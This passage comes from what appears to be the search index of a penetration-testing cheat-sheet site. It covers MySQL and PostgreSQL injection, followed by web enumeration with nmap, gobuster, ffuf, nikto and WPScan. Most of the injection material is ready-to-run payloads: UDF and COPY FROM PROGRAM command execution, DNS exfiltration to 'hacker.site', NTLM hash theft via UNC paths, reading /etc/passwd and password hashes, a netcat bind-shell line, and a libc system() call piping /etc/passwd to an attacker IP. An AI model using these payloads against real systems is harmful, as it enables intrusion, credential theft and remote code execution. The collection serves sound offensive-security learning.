<code>MySQL &gt;= 5.7.22</code></p> <p>Use <code>json_arrayagg()</code> instead of <code>group_concat()</code> which allows less symbols to be displayed * group_concat() = 1024 symbols * json_arrayagg() &gt; 16,000,000 symbols</p> <pre><code>SELECT json_arrayagg(concat_ws(0x3a,table_schema,table_name)) from INFORMATION_SCHEMA.TABLES;\n</code></pre>"},{"location":"sql-injection-attacks/MySQL-injection/#mysql-udf-command-execution","title":"MYSQL UDF command execution","text":"<p>First you need to check if the UDF are installed on the server.</p> <pre><code>$ whereis lib_mysqludf_sys.so\n/usr/lib/lib_mysqludf_sys.so\n</code></pre> <p>Then you can use functions such as <code>sys_exec</code> and <code>sys_eval</code>.</p> <pre><code>$ mysql -u root -p mysql\nEnter password: [...]\nmysql&gt; SELECT sys_eval('id');\n+--------------------------------------------------+\n| sys_eval('id') |\n+--------------------------------------------------+\n| uid=118(mysql) gid=128(mysql) groups=128(mysql) |\n+--------------------------------------------------+\n</code></pre>"},{"location":"sql-injection-attacks/MySQL-injection/#mysql-out-of-band","title":"MYSQL Out of band","text":"<pre><code>select @@version into outfile '\\\\\\\\192.168.0.100\\\\temp\\\\out.txt';\nselect @@version into dumpfile '\\\\\\\\192.168.0.100\\\\temp\\\\out.txt\n</code></pre>"},{"location":"sql-injection-attacks/MySQL-injection/#dns-exfiltration","title":"DNS exfiltration","text":"<pre><code>select load_file(concat('\\\\\\\\',version(),'.hacker.site\\\\a.txt'));\nselect load_file(concat(0x5c5c5c5c,version(),0x2e6861636b65722e736974655c5c612e747874))\n</code></pre>"},{"location":"sql-injection-attacks/MySQL-injection/#unc-path-ntlm-hash-stealing","title":"UNC Path - NTLM hash stealing","text":"<pre><code>select load_file('\\\\\\\\error\\\\abc');\nselect load_file(0x5c5c5c5c6572726f725c5c616263);\nselect 'osanda' into dumpfile '\\\\\\\\error\\\\abc';\nselect 'osanda' into outfile '\\\\\\\\error\\\\abc';\nload data infile '\\\\\\\\error\\\\abc' into table database.table_name;\n</code></pre>"},{"location":"sql-injection-attacks/MySQL-injection/#mysql-waf-bypass","title":"MYSQL WAF Bypass","text":""},{"location":"sql-injection-attacks/MySQL-injection/#alternative-to-information-schema","title":"Alternative to information schema","text":"<p><code>information_schema.tables</code> alternative</p> <pre><code>select * from mysql.innodb_table_stats;\n+----------------+-----------------------+---------------------+--------+----------------------+--------------------------+\n| database_name  | table_name            | last_update         | n_rows | clustered_index_size | sum_of_other_index_sizes |\n+----------------+-----------------------+---------------------+--------+----------------------+--------------------------+\n| dvwa           | guestbook             | 2017-01-19 21:02:57 |      0 |                    1 |                        0 |\n| dvwa           | users                 | 2017-01-19 21:03:07 |      5 |                    1 |                        0 |\n...\n+----------------+-----------------------+---------------------+--------+----------------------+--------------------------+\n\nmysql&gt; show tables in dvwa;\n+----------------+\n| Tables_in_dvwa |\n+----------------+\n| guestbook      |\n| users          |\n+----------------+\n</code></pre>"},{"location":"sql-injection-attacks/MySQL-injection/#alternative-to-version","title":"Alternative to version","text":"<pre><code>mysql&gt; select @@innodb_version;\n+------------------+\n| @@innodb_version |\n+------------------+\n| 5.6.31           |\n+------------------+\n\nmysql&gt; select @@version;\n+-------------------------+\n| @@version               |\n+-------------------------+\n| 5.6.31-0ubuntu0.15.10.1 |\n+-------------------------+\n\nmysql&gt; mysql&gt; select version();\n+-------------------------+\n| version()               |\n+-------------------------+\n| 5.6.31-0ubuntu0.15.10.1 |\n+-------------------------+\n</code></pre>"},{"location":"sql-injection-attacks/MySQL-injection/#scientific-notation","title":"Scientific Notation","text":"<p>In MySQL, the e notation is used to represent numbers in scientific notation. It's a way to express very large or very small numbers in a concise format. The e notation consists of a number followed by the letter e and an exponent. The format is: <code>base 'e' exponent</code>.</p> <p>For example:  * <code>1e3</code> represents <code>1 x 10^3</code> which is <code>1000</code>.  * <code>1.5e3</code> represents <code>1.5 x 10^3</code> which is <code>1500</code>.  * <code>2e-3</code> represents <code>2 x 10^-3</code> which is <code>0.002</code>. </p> <p>The following queries are equivalent:  * <code>SELECT table_name FROM information_schema 1.e.tables</code>  * <code>SELECT table_name FROM information_schema .tables</code> </p> <p>In the same way, the common payload to bypass authentication <code>' or ''='</code> is equivalent to <code>' or 1.e('')='</code> and <code>1' or 1.e(1) or '1'='1</code>.  This technique can be used to obfuscate queries to bypass WAF, for example: <code>1.e(ascii 1.e(substring(1.e(select password from users limit 1 1.e,1 1.e) 1.e,1 1.e,1 1.e)1.e)1.e) = 70 or'1'='2</code> </p>"},{"location":"sql-injection-attacks/MySQL-injection/#conditional-comments","title":"Conditional Comments","text":"<ul> <li><code>/*! ... */</code>: This is a conditional MySQL comment. The code inside this comment will be executed only if the MySQL version is greater than or equal to the number immediately following the <code>/*!</code>. If the MySQL version is less than the specified number, the code inside the comment will be ignored. <ul> <li><code>/*!12345UNION*/</code>: This means that the word UNION will be executed as part of the SQL statement if the MySQL version is 12.345 or higher.</li> <li><code>/*!31337SELECT*/</code>: Similarly, the word SELECT will be executed if the MySQL version is 31.337 or higher. Examples: <code>/*!12345UNION*/</code>, <code>/*!31337SELECT*/</code></li> </ul> </li> </ul>"},{"location":"sql-injection-attacks/MySQL-injection/#wide-byte-injection","title":"Wide byte injection","text":"<p>Wide byte injection is a specific type of SQL injection attack that targets applications using multi-byte character sets, like GBK or SJIS. The term \"wide byte\" refers to character encodings where one character can be represented by more than one byte. This type of injection is particularly relevant when the application and the database interpret multi-byte sequences differently.</p> <p>The <code>SET NAMES gbk</code> query can be exploited in a charset-based SQL injection attack. When the character set is set to GBK, certain multibyte characters can be used to bypass the escaping mechanism and inject malicious SQL code.</p> <p>Several characters can be used to triger the injection.</p> <ul> <li><code>%bf%27</code>: This is a URL-encoded representation of the byte sequence <code>0xbf27</code>. In the GBK character set, <code>0xbf27</code> decodes to a valid multibyte character followed by a single quote ('). When MySQL encounters this sequence, it interprets it as a single valid GBK character followed by a single quote, effectively ending the string.</li> <li><code>%bf%5c</code>: Represents the byte sequence <code>0xbf5c</code>. In GBK, this decodes to a valid multi-byte character followed by a backslash (<code>\\</code>). This can be used to escape the next character in the sequence.</li> <li><code>%a1%27</code>: Represents the byte sequence <code>0xa127</code>. In GBK, this decodes to a valid multi-byte character followed by a single quote (<code>'</code>).</li> </ul> <p>A lot of payloads can be created such as:</p> <pre><code>%A8%27 OR 1=1;--\n%8C%A8%27 OR 1=1--\n%bf' OR 1=1 -- --\n</code></pre> <p>Here is a PHP example using GBK encoding and filtering the user input to escape backslash, single and double quote.</p> <pre><code>function check_addslashes($string)\n{\n    $string = preg_replace('/'. preg_quote('\\\\') .'/', \"\\\\\\\\\\\\\", $string);          //escape any backslash\n    $string = preg_replace('/\\'/i', '\\\\\\'', $string);                               //escape single quote with a backslash\n    $string = preg_replace('/\\\"/', \"\\\\\\\"\", $string);                                //escape double quote with a backslash\n\n    return $string;\n}\n\n$id=check_addslashes($_GET['id']);\nmysql_query(\"SET NAMES gbk\");\n$sql=\"SELECT * FROM users WHERE id='$id' LIMIT 0,1\";\nprint_r(mysql_error());\n</code></pre> <p>Here's a breakdown of how the wide byte injection works:</p> <p>For instance, if the input is <code>?id=1'</code>, PHP will add a backslash, resulting in the SQL query: <code>SELECT * FROM users WHERE id='1\\'' LIMIT 0,1</code>.</p> <p>However, when the sequence <code>%df</code> is introduced before the single quote, as in <code>?id=1%df'</code>, PHP still adds the backslash. This results in the SQL query: <code>SELECT * FROM users WHERE id='1%df\\'' LIMIT 0,1</code>. </p> <p>In the GBK character set, the sequence <code>%df%5c</code> translates to the character <code>\u9023</code>. So, the SQL query becomes: <code>SELECT * FROM users WHERE id='1\u9023'' LIMIT 0,1</code>. Here, the wide byte character <code>\u9023</code> effectively \"eating\" the added escape charactr, allowing for SQL injection.</p> <p>Therefore, by using the payload <code>?id=1%df' and 1=1 --+</code>, after PHP adds the backslash, the SQL query transforms into: <code>SELECT * FROM users WHERE id='1\u9023' and 1=1 --+' LIMIT 0,1</code>. This altered query can be successfully injected, bypassing the intended SQL logic.</p>"},{"location":"sql-injection-attacks/MySQL-injection/#references","title":"References","text":"<ul> <li>MySQL Out of Band Hacking - @OsandaMalith</li> <li>[Sqli] Extracting data without knowing columns names - Ahmed Sultan @0x4148</li> <li>Help \u043f\u043e MySql \u0438\u043d\u044a\u0435\u043a\u0446\u0438\u044f\u043c - rdot.org</li> <li>SQL Truncation Attack - Warlock</li> <li>HackerOne @ajxchapman 50m-ctf writeup - Alex Chapman @ajxchapman</li> <li>SQL Wiki - netspi</li> <li>ekoparty web_100 - 2016/10/26 - p4-team</li> <li>Websec - MySQL - Roberto Salgado - May 29, 2013.</li> <li>A Scientific Notation Bug in MySQL left AWS WAF Clients Vulnerable to SQL Injection - Marc Olivier Bergeron - Oct 19, 2021</li> <li>How to Use SQL Calls to Secure Your Web Site - IT SECURITY CENTER (ISEC) INFORMATION-TECHNOLOGY PROMOTION AGENCY</li> </ul>"},{"location":"sql-injection-attacks/PostgreSQL-injection/","title":"PostgreSQL injection","text":""},{"location":"sql-injection-attacks/PostgreSQL-injection/#summary","title":"Summary","text":"<ul> <li>PostgreSQL Comments</li> <li>PostgreSQL version</li> <li>PostgreSQL Current User</li> <li>PostgreSQL List Users</li> <li>PostgreSQL List Password Hashes</li> <li>PostgreSQL List Database Administrator Accounts</li> <li>PostgreSQL List Privileges</li> <li>PostgreSQL Check if Current User is Superuser</li> <li>PostgreSQL database name</li> <li>PostgreSQL List databases</li> <li>PostgreSQL List tables</li> <li>PostgreSQL List columns</li> <li>PostgreSQL Error Based</li> <li>PostgreSQL XML Helpers</li> <li>PostgreSQL Blind</li> <li>PostgreSQL Time Based</li> <li>PostgreSQL Stacked query</li> <li>PostgreSQL File Read</li> <li>PostgreSQL File Write</li> <li>PostgreSQL Command execution<ul> <li>CVE-2019\u20139193</li> <li>Using libc.so.6</li> </ul> </li> <li>Bypass Filter</li> <li>References</li> </ul>"},{"location":"sql-injection-attacks/PostgreSQL-injection/#postgresql-comments","title":"PostgreSQL Comments","text":"<pre><code>--\n/**/  \n</code></pre>"},{"location":"sql-injection-attacks/PostgreSQL-injection/#postgresql-chain-injection-points-symbols","title":"PostgreSQL chain injection points symbols","text":"<pre><code>; #Used to terminate a SQL command. The only place it can be used within a statement is within a string constant or quoted identifier.\n|| #or statement \n\n# usage examples: \n/?whatever=1;(select 1 from pg_sleep(5))\n/?whatever=1||(select 1 from pg_sleep(5))\n</code></pre>"},{"location":"sql-injection-attacks/PostgreSQL-injection/#postgresql-version","title":"PostgreSQL Version","text":"<pre><code>SELECT version()\n</code></pre>"},{"location":"sql-injection-attacks/PostgreSQL-injection/#postgresql-current-user","title":"PostgreSQL Current User","text":"<pre><code>SELECT user;\nSELECT current_user;\nSELECT session_user;\nSELECT usename FROM pg_user;\nSELECT getpgusername();\n</code></pre>"},{"location":"sql-injection-attacks/PostgreSQL-injection/#postgresql-list-users","title":"PostgreSQL List Users","text":"<pre><code>SELECT usename FROM pg_user\n</code></pre>"},{"location":"sql-injection-attacks/PostgreSQL-injection/#postgresql-list-password-hashes","title":"PostgreSQL List Password Hashes","text":"<pre><code>SELECT usename, passwd FROM pg_shadow \n</code></pre>"},{"location":"sql-injection-attacks/PostgreSQL-injection/#postgresql-list-database-administrator-accounts","title":"PostgreSQL List Database Administrator Accounts","text":"<pre><code>SELECT usename FROM pg_user WHERE usesuper IS TRUE\n</code></pre>"},{"location":"sql-injection-attacks/PostgreSQL-injection/#postgresql-list-privileges","title":"PostgreSQL List Privileges","text":"<pre><code>SELECT usename, usecreatedb, usesuper, usecatupd FROM pg_user\n</code></pre>"},{"location":"sql-injection-attacks/PostgreSQL-injection/#postgresql-check-if-current-user-is-superuser","title":"PostgreSQL Check if Current User is Superuser","text":"<pre><code>SHOW is_superuser; \nSELECT current_setting('is_superuser');\nSELECT usesuper FROM pg_user WHERE usename = CURRENT_USER;\n</code></pre>"},{"location":"sql-injection-attacks/PostgreSQL-injection/#postgresql-database-name","title":"PostgreSQL Database Name","text":"<pre><code>SELECT current_database()\n</code></pre>"},{"location":"sql-injection-attacks/PostgreSQL-injection/#postgresql-list-database","title":"PostgreSQL List Database","text":"<pre><code>SELECT datname FROM pg_database\n</code></pre>"},{"location":"sql-injection-attacks/PostgreSQL-injection/#postgresql-list-tables","title":"PostgreSQL List Tables","text":"<pre><code>SELECT table_name FROM information_schema.tables\n</code></pre>"},{"location":"sql-injection-attacks/PostgreSQL-injection/#postgresql-list-columns","title":"PostgreSQL List Columns","text":"<pre><code>SELECT column_name FROM information_schema.columns WHERE table_name='data_table'\n</code></pre>"},{"location":"sql-injection-attacks/PostgreSQL-injection/#postgresql-error-based","title":"PostgreSQL Error Based","text":"<pre><code>,cAsT(chr(126)||vErSiOn()||chr(126)+aS+nUmeRiC)\n,cAsT(chr(126)||(sEleCt+table_name+fRoM+information_schema.tables+lImIt+1+offset+data_offset)||chr(126)+as+nUmeRiC)--\n,cAsT(chr(126)||(sEleCt+column_name+fRoM+information_schema.columns+wHerE+table_name='data_table'+lImIt+1+offset+data_offset)||chr(126)+as+nUmeRiC)--\n,cAsT(chr(126)||(sEleCt+data_column+fRoM+data_table+lImIt+1+offset+data_offset)||chr(126)+as+nUmeRiC)\n\n' and 1=cast((SELECT concat('DATABASE: ',current_database())) as int) and '1'='1\n' and 1=cast((SELECT table_name FROM information_schema.tables LIMIT 1 OFFSET data_offset) as int) and '1'='1\n' and 1=cast((SELECT column_name FROM information_schema.columns WHERE table_name='data_table' LIMIT 1 OFFSET data_offset) as int) and '1'='1\n' and 1=cast((SELECT data_column FROM data_table LIMIT 1 OFFSET data_offset) as int) and '1'='1\n</code></pre>"},{"location":"sql-injection-attacks/PostgreSQL-injection/#postgresql-xml-helpers","title":"PostgreSQL XML helpers","text":"<pre><code>select query_to_xml('select * from pg_user',true,true,''); -- returns all the results as a single xml row\n</code></pre> <p>The <code>query_to_xml</code> above returns all the results of the specified query as a single result. Chain this with the PostgreSQL Error Based technique to exfiltrate data without having to worry about <code>LIMIT</code>ing your query to one result.</p> <pre><code>select database_to_xml(true,true,''); -- dump the current database to XML\nselect database_to_xmlschema(true,true,''); -- dump the current db to an XML schema\n</code></pre> <p>Note, with the above queries, the output needs to be assembled in memory. For larger databases, this might cause a slow down or denial of service condition.</p>"},{"location":"sql-injection-attacks/PostgreSQL-injection/#postgresql-blind","title":"PostgreSQL Blind","text":"<pre><code>' and substr(version(),1,10) = 'PostgreSQL' and '1  -&gt; OK\n' and substr(version(),1,10) = 'PostgreXXX' and '1  -&gt; KO\n</code></pre>"},{"location":"sql-injection-attacks/PostgreSQL-injection/#postgresql-time-based","title":"PostgreSQL Time Based","text":""},{"location":"sql-injection-attacks/PostgreSQL-injection/#identify-time-based","title":"Identify time based","text":"<pre><code>select 1 from pg_sleep(5)\n;(select 1 from pg_sleep(5))\n||(select 1 from pg_sleep(5))\n</code></pre>"},{"location":"sql-injection-attacks/PostgreSQL-injection/#database-dump-time-based","title":"Database dump time based","text":"<pre><code>select case when substring(datname,1,1)='1' then pg_sleep(5) else pg_sleep(0) end from pg_database limit 1\n</code></pre>"},{"location":"sql-injection-attacks/PostgreSQL-injection/#table-dump-time-based","title":"Table dump time based","text":"<pre><code>select case when substring(table_name,1,1)='a' then pg_sleep(5) else pg_sleep(0) end from information_schema.tables limit 1\n</code></pre>"},{"location":"sql-injection-attacks/PostgreSQL-injection/#columns-dump-time-based","title":"columns dump time based","text":"<pre><code>select case when substring(column,1,1)='1' then pg_sleep(5) else pg_sleep(0) end from table_name limit 1\nselect case when substring(column,1,1)='1' then pg_sleep(5) else pg_sleep(0) end from table_name where column_name='value' limit 1\n</code></pre> <pre><code>AND [RANDNUM]=(SELECT [RANDNUM] FROM PG_SLEEP([SLEEPTIME]))\nAND [RANDNUM]=(SELECT COUNT(*) FROM GENERATE_SERIES(1,[SLEEPTIME]000000))\n</code></pre>"},{"location":"sql-injection-attacks/PostgreSQL-injection/#postgresql-stacked-query","title":"PostgreSQL Stacked Query","text":"<p>Use a semi-colon \";\" to add another query</p> <pre><code>http://host/vuln.php?id=injection';create table NotSoSecure (data varchar(200));--\n</code></pre>"},{"location":"sql-injection-attacks/PostgreSQL-injection/#postgresql-file-read","title":"PostgreSQL File Read","text":"<pre><code>select pg_ls_dir('./');\nselect pg_read_file('PG_VERSION', 0, 200);\n</code></pre> <p>NOTE: Earlier versions of Postgres did not accept absolute paths in <code>pg_read_file</code> or <code>pg_ls_dir</code>. Newer versions (as of this commit) will allow reading any file/filepath for super users or users in the <code>default_role_read_server_files</code> group.</p> <pre><code>CREATE TABLE temp(t TEXT);\nCOPY temp FROM '/etc/passwd';\nSELECT * FROM temp limit 1 offset 0;\n</code></pre> <pre><code>SELECT lo_import('/etc/passwd'); -- will create a large object from the file and return the OID\nSELECT lo_get(16420); -- use the OID returned from the above\nSELECT * from pg_largeobject; -- or just get all the large objects and their data\n</code></pre>"},{"location":"sql-injection-attacks/PostgreSQL-injection/#postgresql-file-write","title":"PostgreSQL File Write","text":"<pre><code>CREATE TABLE pentestlab (t TEXT);\nINSERT INTO pentestlab(t) VALUES('nc -lvvp 2346 -e /bin/bash');\nSELECT * FROM pentestlab;\nCOPY pentestlab(t) TO '/tmp/pentestlab';\n</code></pre> <p>Or as one line: <pre><code>COPY (SELECT 'nc -lvvp 2346 -e /bin/bash') TO '/tmp/pentestlab';\n</code></pre></p> <pre><code>SELECT lo_from_bytea(43210, 'your file data goes in here'); -- create a large object with OID 43210 and some data\nSELECT lo_put(43210, 20, 'some other data'); -- append data to a large object at offset 20\nSELECT lo_export(43210, '/tmp/testexport'); -- export data to /tmp/testexport\n</code></pre>"},{"location":"sql-injection-attacks/PostgreSQL-injection/#postgresql-command-execution","title":"PostgreSQL Command execution","text":""},{"location":"sql-injection-attacks/PostgreSQL-injection/#cve-20199193","title":"CVE-2019\u20139193","text":"<p>Can be used from Metasploit if you have a direct access to the database, otherwise you need to execute manually the following SQL queries. </p> <pre><code>DROP TABLE IF EXISTS cmd_exec;          -- [Optional] Drop the table you want to use if it already exists\nCREATE TABLE cmd_exec(cmd_output text); -- Create the table you want to hold the command output\nCOPY cmd_exec FROM PROGRAM 'id';        -- Run the system command via the COPY FROM PROGRAM function\nSELECT * FROM cmd_exec;                 -- [Optional] View the results\nDROP TABLE IF EXISTS cmd_exec;          -- [Optional] Remove the table\n</code></pre> <p></p>"},{"location":"sql-injection-attacks/PostgreSQL-injection/#using-libcso6","title":"Using libc.so.6","text":"<pre><code>CREATE OR REPLACE FUNCTION system(cstring) RETURNS int AS '/lib/x86_64-linux-gnu/libc.so.6', 'system' LANGUAGE 'c' STRICT;\nSELECT system('cat /etc/passwd | nc &lt;attacker IP&gt; &lt;attacker port&gt;');\n</code></pre>"},{"location":"sql-injection-attacks/PostgreSQL-injection/#bypass-filter","title":"Bypass Filter","text":""},{"location":"sql-injection-attacks/PostgreSQL-injection/#quotes","title":"Quotes","text":"<p>Using CHR</p> <pre><code>SELECT CHR(65)||CHR(66)||CHR(67);\n</code></pre> <p>Using Dollar-signs  ( &gt;= version 8 PostgreSQL)</p> <pre><code>SELECT $$This is a string$$\nSELECT $TAG$This is another string$TAG$\n</code></pre>"},{"location":"sql-injection-attacks/PostgreSQL-injection/#references","title":"References","text":"<ul> <li>A Penetration Tester\u2019s Guide to PostgreSQL - David Hayter</li> <li>Authenticated Arbitrary Command Execution on PostgreSQL 9.3 &gt; Latest - Mar 20 2019 - GreenWolf</li> <li>SQL Injection /webApp/oma_conf ctx parameter (viestinta.lahitapiola.fi) - December 8, 2016 - Sergey Bobrov (bobrov)</li> <li>POSTGRESQL 9.X REMOTE COMMAND EXECUTION - 26 Oct 17 - Daniel</li> <li>SQL Injection and Postgres - An Adventure to Eventual RCE - May 05, 2020 - Denis Andzakovic</li> <li>Advanced PostgreSQL SQL Injection and Filter Bypass Techniques - 2009 - INFIGO</li> </ul>"},{"location":"web-application-attacks/assessment-tools-%26-enumeration/","title":"Assessment tools & enumeration","text":""},{"location":"web-application-attacks/assessment-tools-%26-enumeration/#fingerprinting-web-servers-with-nmap","title":"Fingerprinting Web Servers with Nmap","text":"<p>We should start web application enumeration from its core component, the web server, since this is the common denominator of any web application that exposes its services.</p> <p>Since we found port 80 open on our target, we can proceed with service discovery. To get started, we'll rely on the nmap service scan (-sV) to grab the web server (-p80) banner.</p> <pre><code>kali@kali:~$ sudo nmap -p80  -sV $ip\nStarting Nmap 7.92 ( https://nmap.org ) at 2022-03-29 05:13 EDT\nNmap scan report for $ip\nHost is up (0.11s latency).\n\nPORT   STATE SERVICE VERSION\n80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))\n</code></pre> <p>Our scan shows that Apache version 2.4.41 is running on the Ubuntu host.</p> <p>To take our enumeration further, we use service-specific Nmap NSE scripts, like http-enum, which performs an initial fingerprinting of the web server.</p> <pre><code>kali@kali:~$ sudo nmap -p80 --script=http-enum $ip\nStarting Nmap 7.92 ( https://nmap.org ) at 2022-03-29 06:30 EDT\nNmap scan report for $ip\nHost is up (0.10s latency).\n\nPORT   STATE SERVICE\n80/tcp open  http\n| http-enum:\n|   /login.php: Possible admin folder\n|   /db/: BlogWorx Database\n|   /css/: Potentially interesting directory w/ listing on 'apache/2.4.41 (ubuntu)'\n|   /db/: Potentially interesting directory w/ listing on 'apache/2.4.41 (ubuntu)'\n|   /images/: Potentially interesting directory w/ listing on 'apache/2.4.41 (ubuntu)'\n|   /js/: Potentially interesting directory w/ listing on 'apache/2.4.41 (ubuntu)'\n|_  /uploads/: Potentially interesting directory w/ listing on 'apache/2.4.41 (ubuntu)'\n\nNmap done: 1 IP address (1 host up) scanned in 16.82 seconds\n</code></pre> <p>As shown above, we discovered several interesting folders that could lead to further details about the target web application.</p> <p>By using Nmap scripts, we managed to discover more application-specific information that we can add to the web server enumeration we performed earlier.</p> <pre><code>nmap --script=http-enum &lt;host&gt;\n\nnmap --script=http-vuln* $ip\n</code></pre>"},{"location":"web-application-attacks/assessment-tools-%26-enumeration/#technology-stack-identification-with-wappalyzer","title":"Technology Stack Identification with Wappalyzer","text":"<p>Along with the active information gathering we performed via Nmap, we can also passively fetch a wealth of information about the application technology stack via Wappalyzer.</p> <p>Once we have registered a free account, we can perform a Technology Lookup on a target domain.</p> <p>From a quick third-party external analysis, it's possible to learn about the OS, the UI framework, the web server, and more. The findings also provide information about JavaScript libraries used by the web application - this can be valuable data, as some versions of JavaScript libraries are known to be affected by several vulnerabilities.</p> <p>https://www.wappalyzer.com/</p>"},{"location":"web-application-attacks/assessment-tools-%26-enumeration/#directory-brute-force-fuzzing","title":"Directory Brute Force / Fuzzing","text":""},{"location":"web-application-attacks/assessment-tools-%26-enumeration/#gobuster","title":"Gobuster","text":"<p>Once we have discovered an application running on a web server, our next step is to map all its publicly-accessible files and directories. To do this, we would need to perform multiple queries against the target to discover any hidden paths. Gobuster is a tool (written in Go language) that can help us with this sort of enumeration. It uses wordlists to discover directories and files on a server through brute forcing.</p> <p>Due to its brute forcing nature, Gobuster can generate quite a lot of traffic, meaning it will not be helpful when staying under the radar is necessary.</p> <p>Gobuster supports different enumeration modes, including fuzzing and dns, but for now, we'll only rely on the dir mode, which enumerates files and directories. We need to specify the target IP using the -u parameter and a wordlist with -w. The default running threads are 10; we can reduce the amount of traffic by setting a lower number via the -t parameter.</p> <pre><code>gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u $ip -x txt,php\n</code></pre> <pre><code>kali@kali:~$ gobuster dir -u $ip -w /usr/share/wordlists/dirb/common.txt -t 5\n===============================================================\nGobuster v3.1.0\nby OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)\n===============================================================\n[+] Url:                     http://$ip\n[+] Method:                  GET\n[+] Threads:                 5\n[+] Wordlist:                /usr/share/wordlists/dirb/common.txt\n[+] Negative Status codes:   404\n[+] User Agent:              gobuster/3.1.0\n[+] Timeout:                 10s\n===============================================================\n2022/03/30 05:16:21 Starting gobuster in directory enumeration mode\n===============================================================\n/.hta                 (Status: 403) [Size: 278]\n/.htaccess            (Status: 403) [Size: 278]\n/.htpasswd            (Status: 403) [Size: 278]\n/css                  (Status: 301) [Size: 312] [--&gt; http://$ip/css/]\n/db                   (Status: 301) [Size: 311] [--&gt; http://$ip/db/]\n/images               (Status: 301) [Size: 315] [--&gt; http://$ip/images/]\n/index.php            (Status: 302) [Size: 0] [--&gt; ./login.php]\n/js                   (Status: 301) [Size: 311] [--&gt; http://$ip/js/]\n/server-status        (Status: 403) [Size: 278]\n/uploads              (Status: 301) [Size: 316] [--&gt; http://$ip/uploads/]\n\n===============================================================\n2022/03/30 05:18:08 Finished\n===============================================================\n</code></pre> <p>Under the /usr/share/wordlists/dirb/ folder we selected the common.txt wordlist, which found ten resources. Four of these resources are inaccessible due to insufficient privileges (Status: 403). However, the remaining six are accessible and deserve further investigation.</p>"},{"location":"web-application-attacks/assessment-tools-%26-enumeration/#extensions","title":"Extensions","text":"<pre><code>sh,txt,php,html,htm,asp,aspx,js,xml,log,json,jpg,jpeg,png,gif,doc,pdf,mpg,mp3,zip,tar.gz,tar\n</code></pre> <p>https://www.kali.org/tools/gobuster/</p>"},{"location":"web-application-attacks/assessment-tools-%26-enumeration/#ffuf","title":"Ffuf","text":""},{"location":"web-application-attacks/assessment-tools-%26-enumeration/#simple-scan","title":"Simple Scan","text":"<pre><code>ffuf -w /opt/dirsearch/small.txt -u http://$ip/FUZZ\n</code></pre>"},{"location":"web-application-attacks/assessment-tools-%26-enumeration/#ignore-http-status-codes","title":"Ignore HTTP Status Codes","text":"<pre><code>ffuf -w /opt/dirsearch/big.txt -u http://$ip:80/FUZZ -fc 401\n</code></pre>"},{"location":"web-application-attacks/assessment-tools-%26-enumeration/#vhost-fuzzing","title":"VHOST Fuzzing","text":"<pre><code>ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H \"Host: FUZZ.horizontall.htb\" -u http://horizontall.htb\n</code></pre>"},{"location":"web-application-attacks/assessment-tools-%26-enumeration/#extension","title":"Extension","text":"<pre><code>ffuf -w /opt/dirsearch/big.txt -u http://bounty.htb/FUZZ -e .asp,.aspx,.txt\n</code></pre>"},{"location":"web-application-attacks/assessment-tools-%26-enumeration/#dirsearch","title":"DirSearch","text":"<pre><code>dirsearch.py -u http://$ip:80/ -e txt,asp,aspx\n</code></pre>"},{"location":"web-application-attacks/assessment-tools-%26-enumeration/#security-testing-with-burp-suite","title":"Security Testing with Burp Suite","text":"<p>Burp Suite is a GUI-based integrated platform for web application security testing. It provides several different tools via the same user interface.</p> <p>While the free Community Edition mainly contains tools used for manual testing, the commercial versions include additional features, including a formidable web application vulnerability scanner. Burp Suite has an extensive feature list and is worth investigating, but we will only explore a few basic functions in this section.</p> <p>We can find Burp Suite Community Edition in Kali under Applications &gt; 03 Web Application Analysis &gt; burpsuite.</p> <p>We can also launch it from the command line with burpsuite:</p> <pre><code>kali@kali:~$ burpsuite\n</code></pre>"},{"location":"web-application-attacks/assessment-tools-%26-enumeration/#banner-grabbing","title":"Banner Grabbing","text":"<pre><code>./whatweb $ip \n# identifies all known services\n</code></pre> <p>https://www.kali.org/tools/whatweb/</p>"},{"location":"web-application-attacks/assessment-tools-%26-enumeration/#nikto","title":"Nikto","text":"<p>Nikto is a very popular and easy to use webserver assessment tool to find potential problems and vulnerabilities quickly. Nikto is written in Perl and comes standard as a tool with Kali Linux.</p> <p>During the scanning process Nikto searches for potential security problems in the form of misconfigurations, default files and folders, insecure objects and outdated software.</p> <p>Nikto is not designed to be stealthy. It scans the target host in the fastest way possible and generates a lot of requests which makes the scanning process very obvious in web server log files and to intrusion detection systems (IDS).</p> <pre><code>nikto -h $ip\nnikto -h $ip -p 80,8080,1234\n#test different ports with one scan\n</code></pre> <pre><code>-Tuning Options\n0 \u2013 File Upload\n1 \u2013 Interesting File / Seen in logs\n2 \u2013 Misconfiguration / Default File\n3 \u2013 Information Disclosure\n4 \u2013 Injection (XSS/Script/HTML)\n5 \u2013 Remote File Retrieval \u2013 Inside Web Root\n6 \u2013 Denial of Service\n7 \u2013 Remote File Retrieval \u2013 Server Wide\n8 \u2013 Command Execution / Remote Shell\n9 \u2013 SQL Injection\na \u2013 Authentication Bypass\nb \u2013 Software Identification\nc \u2013 Remote Source Inclusion\nx \u2013 Reverse Tuning Options (i.e., include all except specified)\n\n\n$ nikto -Display 1234EP -o report.html -Format htm -Tuning 123bde -host $ip\n# Command\n</code></pre>"},{"location":"web-application-attacks/assessment-tools-%26-enumeration/#wordpress-scan","title":"WordPress Scan","text":"<p>WPScan is a popular WordPress vulnerability scanner that can be used to find known vulnerabilities in WordPress, enumerate users, themes and plugins and run dictionary attacks on the user accounts.</p> <p>WordPress is a very popular blogging platform and is used by numerous websites. The blogging platform is easy to install and can be customized using a lot of (free) plugins and themes. Because of its popularity among bloggers and website owners, it is also a popular target for (black hat) hackers. The reason it\u2019s so popular among hackers is not only because WordPress itself has a long history of severe vulnerabilities, but also because WordPress plugins and themes can introduce vulnerabilities. Website administrators who do not keep up with WordPress updates and do not take appropriate security measures, such as installing Website Application Firewalls (WAFs), can become easy targets that even the most inexperienced hackers can take advantage of.</p>"},{"location":"web-application-attacks/assessment-tools-%26-enumeration/#updating-db-of-wordpress","title":"Updating DB of WordPress","text":"<pre><code>wpscan --update\n</code></pre>"},{"location":"web-application-attacks/assessment-tools-%26-enumeration/#scanning-the-targer","title":"Scanning the Targer","text":"<pre><code>wpscan --url &lt;ip&gt;\n</code></pre>"},{"location":"web-application-attacks/assessment-tools-%26-enumeration/#active-enumeration","title":"Active Enumeration","text":"<p>If WPScan is unable to find plugins with the default scan, it doesn\u2019t necessarily mean that the WordPress website doesn\u2019t have any plugins installed. The default scan option 